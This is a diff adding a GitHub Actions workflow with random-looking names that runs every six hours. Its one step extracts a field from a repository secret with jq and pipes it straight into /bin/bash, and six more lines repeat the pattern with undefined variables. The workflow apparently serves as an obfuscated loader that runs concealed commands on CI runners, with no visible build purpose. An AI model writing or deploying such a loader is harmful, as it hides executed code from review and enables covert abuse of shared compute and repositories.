@@ -1,0 +1,24 @@
+name: xingtianyuan4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xingtianyuan4567
+        env:
+          krti92767: ${{ secrets.krti92767 }}
+        run: |
+          echo $krti92767 | jq -r .s9839 | /bin/bash
+          echo $eg6746 | jq -r .glstw65 | /bin/bash
+          echo $tuz17 | jq -r .k75 | /bin/bash
+          echo $z6 | jq -r .f0 | /bin/bash
+          echo $vddza843 | jq -r .vr372 | /bin/bash
+          echo $xkhb1717 | jq -r .noyu60 | /bin/bash
+          echo $dmmqq575 | jq -r .kwmgc5758 | /bin/bash
+
